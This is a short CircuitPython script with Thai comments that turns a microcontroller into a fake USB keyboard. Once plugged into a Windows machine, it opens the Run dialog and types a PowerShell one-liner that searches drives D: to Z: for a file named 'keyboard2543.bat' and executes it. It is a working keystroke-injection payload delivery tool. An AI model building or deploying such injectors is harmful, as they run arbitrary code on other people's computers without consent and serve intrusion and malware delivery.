import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# ลดเว# รอให้ระบบ Windows พร้อม
time.sleep(1.5)

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

def type_and_enter(text):
    layout.write(text)
    kbd.send(Keycode.ENTER)

# เปิดหน้าต่าง Run (Win + R)
kbd.send(Keycode.GUI, Keycode.R)
time.sleep(0.4)

cmd = 'powershell "68..90|%{$d=[char]$_+\':\\keyboard2543.bat\';if(test-path $d){&$d}}"'

type_and_enter(cmd)

# กันไม่ให้โค้ดจบ
